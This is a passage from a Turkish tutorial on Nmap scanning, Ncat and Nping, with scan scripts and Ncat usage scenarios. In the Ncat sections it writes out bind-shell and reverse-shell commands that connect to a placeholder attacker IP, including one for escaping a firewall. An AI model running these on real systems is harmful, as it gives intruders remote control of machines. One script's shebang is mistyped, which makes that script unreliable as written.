sudo nmap -p- -sS -sV -sC --script=http-headers,ssl-enum-ciphers,http-vuln* -O -T4 -oA web_sunucu_detayli_rapor <hedef_web_sunucusu_ip_veya_domain>
```
**Adımlar ve Açıklamalar:**
*   `-p-`: Tüm 65535 TCP portunu tara. (Eğer sadece standart web portlarını (80, 443) taramak isterseniz `-p 80,443` kullanın, bu çok daha hızlı olacaktır).
*   `-sS`: TCP SYN taraması (root/admin yetkisi gerektirir).
*   `-sV`: Servis versiyonlarını tespit et.
*   `-sC`: Varsayılan güvenli NSE scriptlerini çalıştır.
*   `--script=http-headers,ssl-enum-ciphers,http-vuln*`: Ek olarak belirli NSE scriptlerini çalıştır:
    *   `http-headers`: HTTP başlıklarını çeker.
    *   `ssl-enum-ciphers`: SSL/TLS şifreleme paketlerini ve protokollerini listeler.
    *   `http-vuln*`: Adı "http-vuln" ile başlayan tüm zafiyet tarama scriptlerini çalıştırır. Alternatif olarak `--script=vuln` genel zafiyet scriptlerini çalıştırır.
*   `-O`: İşletim sistemini tahmin etmeye çalış.
*   `-T4`: Agresif zamanlama.
*   `-oA web_sunucu_detayli_rapor`: Sonuçları `web_sunucu_detayli_rapor` önekiyle kaydet.
*   `<hedef_web_sunucusu_ip_veya_domain>`: Taranacak web sunucusunun IP adresini veya alan adını girin.

**Analiz:**
*   Açık portları kontrol edin. Sadece HTTP (80) ve HTTPS (443) mi açık, yoksa beklenmedik başka portlar var mı?
*   Servis versiyonlarını inceleyin (Apache, Nginx, IIS vb.). Güncel mi, bilinen zafiyetleri var mı?
*   HTTP başlıklarına bakın (`Server`, `X-Powered-By` gibi başlıklar bilgi sızdırıyor mu? Güvenlik başlıkları (`Strict-Transport-Security`, `Content-Security-Policy` vb.) kullanılıyor mu?).
*   SSL/TLS yapılandırmasını kontrol edin (zayıf şifreleme paketleri, eski protokol versiyonları (SSLv3, TLSv1.0) kullanılıyor mu?).
*   NSE scriptlerinin (`http-vuln*`, `vuln`) bulduğu potansiyel zafiyetleri değerlendirin.

#### Senaryo 3: Şirket İç Ağında Açık RDP veya SMB Portlarını Tespit Etme

**Amaç:** Bir şirket iç ağında, potansiyel olarak risk oluşturabilecek açık Windows Uzak Masaüstü (RDP - port 3389) veya SMB/CIFS (port 137, 138, 139, 445) portlarını tespit etmek.
**Komut:**
```bash
sudo nmap -p T:3389,U:137-138,T:139,445 -sS -sU -sV --script=smb-os-discovery,rdp-enum-encryption -T4 -oA rdp_smb_tarama 10.0.0.0/16
```
**Adımlar ve Açıklamalar:**
*   `-p T:3389,U:137-138,T:139,445`: Belirtilen TCP ve UDP portlarını tara.
    *   `T:3389`: RDP için TCP portu.
    *   `U:137-138`: NetBIOS Name Service ve Datagram Service için UDP portları (SMB için önemli).
    *   `T:139`: NetBIOS Session Service için TCP portu (SMB için önemli).
    *   `T:445`: Microsoft-DS (SMB over TCP) için TCP portu.
*   `-sS`: TCP SYN taraması.
*   `-sU`: UDP taraması.
*   `-sV`: Servis versiyonlarını tespit et.
*   `--script=smb-os-discovery,rdp-enum-encryption`:
    *   `smb-os-discovery`: SMB üzerinden işletim sistemi ve diğer bilgileri toplar.
    *   `rdp-enum-encryption`: RDP servisinin desteklediği şifreleme seviyelerini ve potansiyel zafiyetleri (örn: CredSSP) kontrol eder.
*   `-T4`: Agresif zamanlama.
*   `-oA rdp_smb_tarama`: Sonuçları kaydet.
*   `10.0.0.0/16`: Taranacak iç ağ aralığını kendi ağınıza göre ayarlayın.

**Analiz:** Hangi makinelerde RDP veya SMB portlarının açık olduğunu belirleyin. `smb-os-discovery` scriptinin çıktıları, makinelerin işletim sistemleri ve adları hakkında bilgi verecektir. `rdp-enum-encryption` çıktısı RDP güvenliği hakkında ipuçları sunabilir. Açık olan bu portların gerçekten gerekli olup olmadığını ve uygun güvenlik önlemlerinin (güçlü şifreler, ağ segmentasyonu, yamalar) alınıp alınmadığını değerlendirin.

#### Senaryo 4: Günlük Otomatik Tarama ve Değişiklik Raporlama Scripti (Bash + Nmap + Ndiff)

**Amaç:** Kritik sunucuları her gün otomatik olarak tarayıp, bir önceki günün sonuçlarıyla karşılaştırarak ağdaki değişiklikleri (yeni açılan/kapanan portlar, değişen servisler) tespit etmek ve raporlamak.
**Bash Script Örneği (`gunluk_tarama_raporu.sh`):**
```bash
#!/binbash

# Ayarlar
SCAN_DIR="/opt/nmap_scans" # Tarama sonuçlarının saklanacağı dizin
TARGET_FILE="/opt/nmap_targets.txt" # Taranacak hedeflerin listelendiği dosya
REPORT_EMAIL="admin@example.com" # Raporun gönderileceği e-posta adresi
TODAY=$(date +%Y-%m-%d)
YESTERDAY=$(date -d "yesterday" +%Y-%m-%d)

# Gerekli dizinleri oluştur
mkdir -p $SCAN_DIR/$TODAY
mkdir -p $SCAN_DIR/$YESTERDAY # Ndiff için gerekebilir, ilk çalıştırmada hata verebilir

# Hedef dosyası var mı kontrol et
if [ ! -f "$TARGET_FILE" ]; then
  echo "Hata: Hedef dosyası bulunamadı: $TARGET_FILE"
  exit 1
fi

echo "Günlük Nmap taraması başlıyor: $TODAY"

# Nmap taramasını yap
sudo nmap -sS -sV -F --reason -oX $SCAN_DIR/$TODAY/scan_$TODAY.xml -iL $TARGET_FILE

echo "Nmap taraması tamamlandı."

# Bir önceki günün tarama sonucu var mı kontrol et ve Ndiff ile karşılaştır
if [ -f "$SCAN_DIR/$YESTERDAY/scan_$YESTERDAY.xml" ]; then
  echo "Ndiff ile değişiklikler karşılaştırılıyor..."
  ndiff $SCAN_DIR/$YESTERDAY/scan_$YESTERDAY.xml $SCAN_DIR/$TODAY/scan_$TODAY.xml > $SCAN_DIR/$TODAY/diff_report_$TODAY.txt

  # Eğer değişiklik varsa e-posta gönder (mailutils paketi kurulu olmalı)
  if [ -s "$SCAN_DIR/$TODAY/diff_report_$TODAY.txt" ]; then # Dosya boş değilse
    echo "Değişiklikler bulundu, rapor e-posta ile gönderiliyor."
    mail -s "Nmap Günlük Değişiklik Raporu - $TODAY" $REPORT_EMAIL < $SCAN_DIR/$TODAY/diff_report_$TODAY.txt
  else
    echo "Değişiklik bulunamadı."
  fi
else
  echo "Karşılaştırılacak bir önceki gün taraması bulunamadı: $SCAN_DIR/$YESTERDAY/scan_$YESTERDAY.xml"
fi

echo "Günlük tarama ve raporlama işlemi tamamlandı."
exit 0
```
**Kullanımı:**
1.  `gunluk_tarama_raporu.sh` dosyasını oluşturun ve çalıştırılabilir yapın (`chmod +x gunluk_tarama_raporu.sh`).
2.  `/opt/nmap_targets.txt` dosyasını oluşturun ve içine taranacak IP adreslerini veya hostnamelerini (her biri yeni satırda) yazın.
3.  Scriptteki `SCAN_DIR`, `TARGET_FILE` ve `REPORT_EMAIL` değişkenlerini kendi ortamınıza göre ayarlayın.
4.  E-posta gönderme için `mailutils` (veya benzeri bir mail aracı) paketinin kurulu olduğundan emin olun (`sudo apt install mailutils`).
5.  Scripti cronjob ile her gün çalışacak şekilde ayarlayın:
    ```bash
    crontab -e
    # Aşağıdaki satırı ekleyin (her sabah 05:00'te çalışması için):
    # 0 5 * * * /path/to/gunluk_tarama_raporu.sh > /var/log/nmap_daily_scan.log 2>&1
    ```

**Analiz:** Script, belirtilen hedefleri her gün tarar, sonuçları XML olarak kaydeder ve bir önceki günün sonuçlarıyla karşılaştırır. Eğer fark varsa (yeni port, kapanan port vb.), `diff_report.txt` dosyası oluşturulur ve e-posta ile gönderilir. Bu, ağınızdaki beklenmedik değişiklikleri proaktif olarak tespit etmenize yardımcı olur.

#### Senaryo 5: Çok Geniş Bir Ağda Segmentli ve Aşamalı Tarama Stratejisi

**Amaç:** Çok büyük bir ağ aralığını (örn: /16, 65,536 IP adresi) etkili bir şekilde taramak.
**Strateji:**
1.  **Aşama 1: Hızlı Host Keşfi (Tüm Aralık İçin):**
    Sadece canlı hostları tespit et.
    ```bash
    sudo nmap -sn -T4 --min-hostgroup 256 --min-rate 1000 -oG - 10.0.0.0/16 | grep "Status: Up" | awk '{print $2}' > canli_hostlar_buyuk_ag.txt
    ```
    *   `-sn`: Ping scan.
    *   `-T4`: Agresif zamanlama.
    *   `--min-hostgroup 256`: Aynı anda 256 hostluk grupları tara.
    *   `--min-rate 1000`: Saniyede en az 1000 paket gönder.
    *   `-oG -`: Grep'lenebilir çıktıyı standart çıktıya ver.
    *   `grep "Status: Up" | awk '{print $2}'`: Sadece "Up" durumundaki hostların IP adreslerini alıp `canli_hostlar_buyuk_ag.txt` dosyasına yaz.

2.  **Aşama 2: Canlı Hostlarda Temel Port Taraması (Segmentlere Bölerek):**
    `canli_hostlar_buyuk_ag.txt` dosyasını daha küçük segmentlere (örn: her biri 256 host içeren dosyalara) bölün. Bu, `split` komutuyla yapılabilir.
    Her segment için temel bir port taraması (örn: en popüler 1000 port) yapın.
    Örnek (tek bir segment için):
    ```bash
    sudo nmap -sS -T4 --top-ports 1000 -iL segment1_canli_hostlar.txt -oA buyuk_ag_segment1_rapor
    ```
    Bu adımı tüm segmentler için tekrarlayın (bir script ile otomatikleştirebilirsiniz).

3.  **Aşama 3: İlginç Bulunan Hostlarda Detaylı Tarama:**
    İkinci aşamada ilginç açık portlar veya servisler bulunan hostlar için daha detaylı taramalar (versiyon tespiti, NSE scriptleri) yapın.
    ```bash
    sudo nmap -sV -sC -A -p <ilginc_portlar> -iL ilginc_hostlar_listesi.txt -oA buyuk_ag_detayli_rapor
    ```

**Neden Bu Strateji?:**
*   **Verimlilik:** Tüm /16 aralığında tüm portları taramak çok uzun sürer. Aşamalı yaklaşım, kaynakları daha etkili kullanır.
*   **Yönetilebilirlik:** Sonuçları daha küçük, yönetilebilir parçalara böler.
*   **Odaklanma:** En çok ilgi çeken hostlara ve portlara odaklanmayı sağlar.

**İpuçları:**
*   Taramaları farklı zamanlarda veya farklı Nmap makinelerinden dağıtarak yükü yayabilirsiniz.
*   Çok büyük taramalar için `masscan` gibi daha hızlı araçlar host keşfi veya temel port taraması için Nmap'e alternatif olarak düşünülebilir, ardından Nmap ile detaylı tarama yapılabilir.

---

## 4. Ncat - Ağ Bağlantıları ve Veri Aktarımı

Ncat (veya `nc`), ağ üzerinden veri okumak, yazmak ve yönlendirmek için son derece esnek ve güçlü bir komut satırı aracıdır. Genellikle "Ağların İsviçre Çakısı" olarak adlandırılır çünkü TCP, UDP ve hatta SSL/TLS üzerinden çok çeşitli ağ görevlerini yerine getirebilir.

### 4.1 Ncat Temel Kavramları

*   **Dinleme (Listen) Modu (`-l` veya `--listen`):** Ncat'in belirli bir port üzerinde gelen bağlantıları beklemesini sağlar. Bu modda Ncat bir sunucu gibi davranır.
*   **Bağlanma (Connect) Modu:** Ncat'in belirli bir host ve porta bağlantı kurmasını sağlar. Bu modda Ncat bir istemci gibi davranır.
*   **Protokoller:** Ncat varsayılan olarak TCP kullanır. UDP kullanmak için `-u` veya `--udp` seçeneği belirtilmelidir.
*   **Standart Girdi/Çıktı (stdin/stdout):** Ncat, standart girdiden okuduğu veriyi ağa gönderir ve ağdan aldığı veriyi standart çıktıya yazar. Bu, Ncat'i diğer komutlarla pipeline (`|`) kullanarak birleştirmeyi çok güçlü kılar.

### 4.2 Temel Ncat Komutları

#### Dinleme Modu

*   **Belirli bir TCP portunda dinleme:**
    ```bash
    ncat -l -p 1234
    # veya kısaca
    ncat -lp 1234
    ```
    Bu komut, 1234 numaralı TCP portunda gelen bağlantıları bekler. Bir bağlantı kurulduğunda, istemciden gelen veriyi standart çıktıya yazar ve standart girdiden yazdığınız veriyi istemciye gönderir. İlk bağlantı kapandıktan sonra Ncat sonlanır.

*   **Belirli bir UDP portunda dinleme:**
    ```bash
    ncat -u -l -p 1234
    # veya kısaca
    ncat -ulp 1234
    ```
    Bu komut, 1234 numaralı UDP portunda gelen datagramları bekler.

*   **Bağlantı sonrası dinlemeye devam etme (`-k` veya `--keep-open`):**
    Varsayılan olarak Ncat, ilk bağlantı sonlandığında kapanır. `-k` seçeneği, bir bağlantı kapandıktan sonra Ncat'in aynı portta dinlemeye devam etmesini sağlar, böylece birden fazla istemciye hizmet verebilir (her biri sırayla).
    ```bash
    ncat -klp 1234 # Birden fazla TCP bağlantısını art arda kabul et
    ```

*   **Ayrıntılı Çıktı (`-v`, `-vv`):**
    Bağlantı durumu hakkında daha fazla bilgi gösterir.
    ```bash
    ncat -vlp 1234
    ```
    Çıktı:
    ```
    Ncat: Version 7.94 ( https://nmap.org/ncat )
    Ncat: Listening on :::1234
    Ncat: Listening on 0.0.0.0:1234
    ```
    Bir bağlantı geldiğinde:
    ```
    Ncat: Connection from 192.168.1.100.
    Ncat: Connection from 192.168.1.100:54321.
    ```

#### Bağlanma Modu

*   **Belirli bir host ve TCP portuna bağlanma:**
    ```bash
    ncat <hedef_ip_veya_hostname> <port>
    ```
    Örnek: Bir web sunucusunun 80. portuna bağlanmak:
    ```bash
    ncat scanme.nmap.org 80
    ```
    Bağlandıktan sonra, HTTP isteği gönderebilirsiniz:
    ```
    GET / HTTP/1.1
    Host: scanme.nmap.org
    Connection: close
    [Enter tuşuna iki kez basın]
    ```
    Sunucudan gelen HTTP yanıtı ekranda görünecektir.

*   **Belirli bir host ve UDP portuna bağlanma:**
    ```bash
    ncat -u <hedef_ip_veya_hostname> <port>
    ```
    Örnek: Bir DNS sunucusuna UDP üzerinden bağlanmak (ancak anlamlı bir sorgu göndermeden pek bir şey olmaz):
    ```bash
    ncat -u 8.8.8.8 53
    ```

#### SSL/TLS Desteği

Ncat, şifreli bağlantılar için SSL/TLS'i destekler.

*   **SSL/TLS ile Dinleme:**
    Bir sertifika ve özel anahtar dosyasına ihtiyacınız olacaktır. Bunları OpenSSL ile oluşturabilirsiniz.
    ```bash
    # Örnek self-signed sertifika oluşturma (test için)
    # openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

    ncat --ssl --ssl-cert cert.pem --ssl-key key.pem -lp 4433
    ```
    Bu, 4433 portunda SSL/TLS şifreli bağlantıları dinler.

*   **SSL/TLS ile Bağlanma:**
    ```bash
    ncat --ssl <hedef_ip_veya_hostname> <ssl_port>
    ```
    Örnek: HTTPS (443) portuna SSL ile bağlanmak:
    ```bash
    ncat --ssl scanme.nmap.org 443
    ```
    Eğer sunucunun sertifikası güvenilir bir CA tarafından imzalanmamışsa (örn: self-signed), Ncat bir uyarı verebilir. `--ssl-verify` (varsayılan) veya `--no-ssl-verify` (güvensiz, sadece test için) seçenekleriyle sertifika doğrulamasını kontrol edebilirsiniz.

#### Temel Dosya Transferi

Ncat, standart girdi/çıktı yönlendirmesi ile kolayca dosya transferi yapabilir.

*   **Dosya Gönderme (Alıcı Dinliyor):**
    *   **Alıcı Taraf (Dinleyici):** Veriyi bir dosyaya kaydeder.
        ```bash
        ncat -lp 1234 > alinan_dosya.dat
        ```
    *   **Gönderici Taraf (Bağlanan):** Dosyayı standart girdiden Ncat'e yönlendirir.
        ```bash
        ncat <alıcı_ip> 1234 < gonderilecek_dosya.txt
        ```

*   **Dosya Alma (Gönderici Dinliyor):**
    *   **Gönderici Taraf (Dinleyici):** Dosyayı standart girdiden okuyup bağlantıya yazar.
        ```bash
        ncat -lp 1234 < gonderilecek_dosya.txt
        ```
    *   **Alıcı Taraf (Bağlanan):** Gelen veriyi bir dosyaya kaydeder.
        ```bash
        ncat <gönderici_ip> 1234 > alinan_dosya.dat
        ```

**Not:** Bu temel dosya transferi şifresizdir (SSL kullanılmadıkça) ve büyük dosyalar için çok verimli olmayabilir. Ancak küçük dosyalar veya metin tabanlı veriler için hızlı ve pratiktir.

### 4.3 Orta Seviye Ncat Uygulamaları

#### Basit Bir Chat Uygulaması Oluşturma

İki Ncat örneği ile basit bir komut satırı chat uygulaması oluşturabilirsiniz.

*   **Sunucu Tarafı (Birinci Terminal):**
    ```bash
    ncat -vlp 5555
    ```
*   **İstemci Tarafı (İkinci Terminal):**
    ```bash
    ncat -v <sunucu_ip> 5555
    ```
    Şimdi bir terminale yazdığınız her şey diğer terminalde görünecektir. `Ctrl+C` ile bağlantıyı sonlandırabilirsiniz.

#### Shell Bağlantıları (Bind ve Reverse Shell) - DİKKAT!

Ncat, bir makinede komut satırı (shell) başlatıp bunu ağ üzerinden erişilebilir hale getirebilir. Bu, sızma testlerinde ve sistem yönetiminde kullanılabilir ancak **çok ciddi güvenlik riskleri** taşır. **Bu teknikleri sadece yasal ve etik sınırlar içinde, izin aldığınız sistemlerde kullanın!**

*   **Bind Shell (Kurban Dinliyor, Saldırgan Bağlanıyor):**
    Kurban makinede bir port açılır ve bu porta bağlanan kişiye shell erişimi verilir.
    *   **Kurban Makinede (örn: Linux):**
        ```bash
        ncat -lp 4444 -e /bin/bash  # Linux için /bin/bash
        # ncat -lp 4444 -e cmd.exe   # Windows için cmd.exe
        ```
        `-e <komut>` (veya `--exec <komut>`): Bağlantı kurulduğunda belirtilen komutu çalıştırır ve I/O'sunu ağa yönlendirir.
    *   **Saldırgan Makinede:**
        ```bash
        ncat <kurban_ip> 4444
        ```
        Bağlantı kurulduğunda, saldırgan kurban makinede komutları çalıştırabilir.
    **Risk:** Kurban makinede açık bir port bırakır ve kimlik doğrulaması olmadan shell erişimi sağlar. Güvenlik duvarları genellikle dışarıdan gelen bu tür bağlantıları engeller.

*   **Reverse Shell (Saldırgan Dinliyor, Kurban Bağlanıyor):**
    Saldırgan makinede bir port dinlenir ve kurban makine bu porta bağlanarak shell'ini saldırgana sunar. Bu yöntem, kurbanın arkasındaki güvenlik duvarlarını (giden bağlantılara genellikle daha toleranslıdır) aşmak için daha etkilidir.
    *   **Saldırgan Makinede (Dinleyici):**
        ```bash
        ncat -vlp 4444
        ```
    *   **Kurban Makinede (Bağlanan ve Shell'i Sunan):**
        ```bash
        ncat <saldırgan_ip> 4444 -e /bin/bash  # Linux için
        # ncat <saldırgan_ip> 4444 -e cmd.exe   # Windows için
        ```
    **Risk:** Kurban makineden dışarıya yetkisiz bir bağlantı açar. Tespit edilmesi zor olabilir.

**UYARI:** `-e` veya `--exec` seçenekleri çok tehlikelidir. Ncat'in bazı modern versiyonlarında güvenlik nedeniyle bu seçenekler varsayılan olarak derlenmemiş olabilir veya `--sh-exec` gibi daha kısıtlı alternatifler sunulabilir. Eğer `-e` çalışmıyorsa, Nmap'in web sitesinden indirilen resmi Ncat sürümünü kullandığınızdan emin olun.

#### Proxy Üzerinden Bağlantı Kurma

Ncat, HTTP veya SOCKS proxy'leri üzerinden bağlantı kurabilir.

*   **HTTP Proxy ile Bağlanma:**
    ```bash
    ncat --proxy <proxy_ip>:<proxy_port> --proxy-type http <hedef_ip> <hedef_port>
    ```
    Eğer proxy kimlik doğrulaması gerekiyorsa:
    ```bash
    ncat --proxy <proxy_ip>:<proxy_port> --proxy-type http --proxy-auth kullanıcı:şifre <hedef_ip> <hedef_port>
    ```

*   **SOCKS4/SOCKS5 Proxy ile Bağlanma:**
    ```bash
    ncat --proxy <proxy_ip>:<proxy_port> --proxy-type socks5 <hedef_ip> <hedef_port>
    # socks4 için --proxy-type socks4
    ```

#### IPv6 Desteği

Ncat, IPv6 adresleriyle de çalışabilir.

*   **IPv6 ile Dinleme (`-6`):**
    ```bash
    ncat -6 -lp 1234
    ```
*   **IPv6 Adresine Bağlanma:**
    Doğrudan IPv6 adresini kullanarak bağlanabilirsiniz.
    ```bash
    ncat fe80::1234:5678:9abc:def0%eth0 80 # Link-local adres için interface belirtmek gerekebilir
    ncat 2001:db8::1 80
    ```

### 4.4 İleri Seviye Ncat Uygulamaları

#### Basit Bir Web Sunucusu veya HTTP İstemcisi Oluşturma

*   **Basit HTTP Sunucusu (Tek Dosya Sunar):**
    `index.html` dosyasını sunan basit bir sunucu:
    ```bash
    while true; do (echo -e "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n"; cat index.html) | ncat -lp 8080; done
    ```
    Bu komut, 8080 portuna gelen her bağlantıya HTTP başlıklarını ve ardından `index.html` dosyasının içeriğini gönderir. `while true` döngüsü ve `-k` olmadan her bağlantıdan sonra Ncat'in yeniden başlatılmasını sağlar. Daha gelişmiş bir versiyon için `-k` ve `-c` (komut çalıştırma) seçenekleri birleştirilebilir.

*   **Basit HTTP İstemcisi (Banner Grabbing):**
    ```bash
    echo -e "GET / HTTP/1.0\r\nHost: example.com\r\n\r\n" | ncat example.com 80
    ```
    Bu, `example.com`'a basit bir GET isteği gönderir ve sunucunun yanıtını (başlıklar ve sayfa içeriği) gösterir.

#### Basit Bir Port Yönlendirme (Port Forwarding)

Ncat, gelen bağlantıları başka bir host ve porta yönlendirebilir.

```bash
ncat -lp <dinlenecek_lokal_port> --sh-exec "ncat <hedef_ip> <hedef_port>"
# veya daha güvenli ve esnek bir yol, özellikle Windows'ta:
# ncat -l <dinlenecek_lokal_port> -c "ncat <hedef_ip> <hedef_port>"
```
Örnek: Lokal makinedeki 8080 portuna gelen tüm bağlantıları `192.168.1.100` adresindeki 80 portuna yönlendirmek:
```bash
ncat -lp 8080 -c "ncat 192.168.1.100 80"
```
**Not:** `--sh-exec` I/O'yu bir shell üzerinden yönlendirir, `-c` (veya `--exec`) ise doğrudan komutu çalıştırır. `-c` genellikle daha stabildir.

#### Basit Bir Log Toplama Sunucusu Kurmak

UDP üzerinden gelen log mesajlarını (örn: syslog) bir dosyaya yazan basit bir sunucu.
```bash
ncat -ulkp 514 >> /var/log/ncat_syslog.log
```
*   `-u`: UDP modu.
*   `-l`: Dinleme modu.
*   `-k`: Bağlantı sonrası dinlemeye devam et.
*   `-p 514`: Syslog için standart UDP portu.
*   `>> /var/log/ncat_syslog.log`: Gelen veriyi belirtilen dosyaya ekle.

#### Zincirleme Proxy Yapıları

Birden fazla Ncat örneğini birbirine bağlayarak trafiği birkaç hop üzerinden yönlendirebilirsiniz. Bu, ağ erişimini karmaşıklaştırmak veya belirli atlatma senaryoları için kullanılabilir.

**Örnek: A -> B -> C -> Hedef**
*   **Makine C (Hedefe En Yakın):**
    ```bash
    # Makine C'de dinle, gelen bağlantıyı Hedef'e yönlendir
    ncat -lp 2222 -c "ncat <hedef_ip> <hedef_port>"
    ```
*   **Makine B (Ortadaki):**
    ```bash
    # Makine B'de dinle, gelen bağlantıyı Makine C'nin 2222 portuna yönlendir
    ncat -lp 1111 -c "ncat <makine_C_ip> 2222"
    ```
*   **Makine A (Başlangıç Noktası):**
    ```bash
    # Makine B'nin 1111 portuna bağlan (bu bağlantı Hedef'e ulaşacak)
    ncat <makine_B_ip> 1111
    ```
    Şimdi Makine A'dan gönderilen trafik Makine B ve C üzerinden Hedef'e ulaşacaktır.

### 4.5 Ncat Örnek Senaryoları

#### Senaryo 1: Bir Servisin Yanıt Verip Vermediğini Kontrol Etmek (Banner Grabbing)

**Amaç:** Bir sunucudaki belirli bir portta çalışan servisin temel bir yanıt verip vermediğini (banner'ını) hızlıca kontrol etmek.
**Komut:**
```bash
# HTTP için
echo "QUIT" | ncat target-server.com 80

# FTP için
echo "QUIT" | ncat target-server.com 21

# SMTP için
echo "QUIT" | ncat target-server.com 25
```
**Açıklama:**
Ncat ile hedefe bağlanılır ve genellikle servisin bir tür banner veya hoş geldin mesajı göndermesi beklenir. `echo "QUIT"` (veya servise uygun başka bir basit komut) Ncat'in hemen kapanmasını engellemek ve sunucudan ilk yanıtı almak için kullanılabilir. `QUIT` komutu genellikle servis tarafından bağlantıyı sonlandırmak için kullanılır.
Bazı servisler ilk bağlantıda hemen banner göndermeyebilir.

**Alternatif (Timeout ile):**
```bash
ncat -w 3 target-server.com 22 # SSH portuna 3 saniye timeout ile bağlanmaya çalış
# Eğer SSH sunucusu ise, "SSH-2.0-..." gibi bir banner görebilirsiniz.
```
*   `-w <saniye>` (veya `--wait <saniye>`): Bağlantı için bir zaman aşımı belirler.

#### Senaryo 2: İki Makine Arasında Güvenli (SSL/TLS) Dosya Transferi

**Amaç:** Hassas bir dosyayı iki makine arasında şifreli bir şekilde transfer etmek.
**Adımlar:**
1.  **Sertifika ve Anahtar Oluşturma (Eğer yoksa, Alıcı Tarafında):**
    ```bash
    openssl req -x509 -newkey rsa:4096 -sha256 -days 365 -nodes -keyout server.key -out server.crt \
    -subj "/C=TR/ST=Ankara/L=Ankara/O=Test Org/OU=IT Department/CN=testserver.example.com"
    ```
    Bu komut, `server.key` (özel anahtar) ve `server.crt` (sertifika) dosyalarını oluşturur. `CN` (Common Name) önemlidir.

2.  **Alıcı Taraf (Dinleyici, SSL ile):**
    `server.crt` ve `server.key` dosyalarının bulunduğu dizinde:
    ```bash
    ncat --ssl --ssl-cert server.crt --ssl-key server.key -lp 4433 > alinan_guvenli_dosya.zip
    echo "Alıcı hazır, 4433 SSL portunda dinleniyor..."
    ```

3.  **Gönderici Taraf (Bağlanan, SSL ile):**
    Gönderilecek dosyanın bulunduğu dizinde:
    ```bash
    # Eğer alıcının sertifikası self-signed ise ve doğrulamayı atlamak istiyorsanız (sadece test için):
    # ncat --ssl --no-ssl-verify <alıcı_ip> 4433 < gonderilecek_hassas_dosya.zip
    # Daha güvenli: Alıcının sertifikasını (server.crt) göndericiye kopyalayın ve --ssl-cafile ile belirtin
    # (veya sistemin güvenilir sertifika deposuna ekleyin)
    ncat --ssl --ssl-cafile /path/to/server.crt <alıcı_ip> 4433 < gonderilecek_hassas_dosya.zip
    echo "Dosya gönderildi."
    ```
**Açıklama:** Bu yöntem, dosyanın ağ üzerinden şifreli olarak aktarılmasını sağlar. Sertifika yönetimi önemlidir. Üretim ortamlarında, güvenilir bir Sertifika Otoritesi (CA) tarafından imzalanmış sertifikalar kullanılmalıdır.

#### Senaryo 3: Firewall Arkasındaki Bir Makineden Dışarıya Reverse Shell Almak

**Amaç:** Bir iç ağda bulunan ve dışarıdan doğrudan erişilemeyen (firewall tarafından engellenen) bir makineden, internet üzerindeki bir saldırgan makinesine reverse shell bağlantısı kurmak. (Bu senaryo tamamen eğitim amaçlıdır ve yasal izinlerle yapılmalıdır!)
**Adımlar:**
1.  **Saldırgan Makinesi (İnternet Üzerinde, Sabit IP'li veya DynDNS'li):**
    Ncat ile belirli bir portta dinlemeye başlar.
    ```bash
    ncat -vlp 4444
    echo "Saldırgan makine 4444 portunda dinliyor..."
    ```

2.  **Kurban Makinesi (Firewall Arkasında, İç Ağda):**
    Saldırgan makinesinin IP adresine ve dinlediği porta bağlanarak shell'ini sunar.
    ```bash
    # Linux'ta:
    ncat <saldırgan_makine_ip> 4444 -e /bin/bash

    # Windows'ta:
    # ncat.exe <saldırgan_makine_ip> 4444 -e cmd.exe
    ```
    Bu komut, kurban makineden saldırgan makineye doğru bir giden bağlantı başlatır. Çoğu firewall, giden bağlantılara daha toleranslı olduğu için bu yöntem bind shell'e göre daha başarılı olabilir.

**Sonuç:** Saldırgan makinesinin Ncat terminalinde, kurban makinenin shell'i belirir ve komut çalıştırılabilir hale gelir.

#### Senaryo 4: Basit Bir "Honeyport" Oluşturma

**Amaç:** Belirli bir portu dinleyerek o porta gelen bağlantı denemelerini loglamak veya basit bir yanıt vermek (saldırganları yanıltmak veya aktiviteyi izlemek için).
**Komut (Gelen bağlantı IP'sini ve basit bir mesajı loglar):**
```bash
while true; do \
  echo "Gelen baglanti: $(date)" | tee -a honeyport.log; \
  ncat -lp 2222 -c 'echo "Erisim reddedildi." && read line && echo "$line" >> honeyport.log'; \
  sleep 1; \
done
```
**Açıklama:**
*   Bu script, 2222 numaralı TCP portunu sürekli olarak dinler (`while true`).
*   Her bağlantı kurulduğunda, bağlantı zamanını `honeyport.log` dosyasına yazar.
*   Bağlanan istemciye "Erisim reddedildi." mesajını gönderir.
*   İstemciden bir satır okumaya çalışır (`read line`) ve bunu da log dosyasına yazar (bazı otomatik tarayıcılar veya botlar veri gönderebilir).
*   `tee -a honeyport.log`: Hem standart çıktıya hem de dosyaya ekleyerek yazar.
*   Bu çok basit bir örnektir. Daha gelişmiş honeypot'lar daha karmaşık davranışlar sergileyebilir.

**Not:** Gerçek bir honeypot çözümü için Pentbox, KFSensor gibi özel yazılımlar veya daha gelişmiş Ncat/Python scriptleri kullanılabilir.

#### Senaryo 5: Ncat ile Basit Bir Broadcast Mesajı Gönderme/Alma

**Amaç:** Lokal ağdaki tüm makinelere UDP üzerinden bir broadcast mesajı göndermek ve yanıtları (veya diğer broadcast mesajlarını) dinlemek.
**Broadcast Mesajı Gönderme:**
```bash
echo "Herkese Merhaba!" | ncat -u --send-only 192.168.1.255 5000
# 192.168.1.255: Kendi ağınızın broadcast adresiyle değiştirin.
# 5000: Kullanılmayan bir UDP portu.
# --send-only: Ncat'in veri gönderdikten sonra hemen çıkmasını sağlar.
```

**Broadcast Mesajlarını Dinleme:**
```bash
ncat -ulkp 5000
```
Bu komut, 5000 numaralı UDP portuna gelen tüm broadcast (veya unicast) mesajlarını dinler ve ekrana yazar. Diğer makinelerden gönderilen broadcast mesajları burada görünecektir. Bu, ağ keşfi veya basit ağ bildirim sistemleri için kullanılabilir.

---

## 5. Nping - Ağ Paketi Oluşturma ve Analiz Aracı

Nping, geleneksel `ping` aracının çok ötesine geçen, ağ paketleri oluşturma, gönderme ve analiz etme yeteneğine sahip güçlü bir Nmap aracıdır. ICMP, TCP, UDP ve ARP protokollerini destekler ve bu protokoller üzerinde son derece özelleştirilebilir paketler oluşturmanıza olanak tanır.

### 5.1 Nping Temel Kavramları

*   **Geleneksel Ping'den Farkları:** Standart `ping` genellikle sadece ICMP Echo Request gönderir. Nping ise farklı protokoller (TCP, UDP, ARP) ve bu protokoller içinde çeşitli paket türleri (örn: TCP SYN, ACK; ICMP Timestamp, Info) gönderebilir. Ayrıca, paket başlıklarındaki birçok alanı (TTL, ToS, IP ID, TCP bayrakları, portlar vb.) manipüle etme imkanı sunar.
*   **Desteklediği Protokoller:**
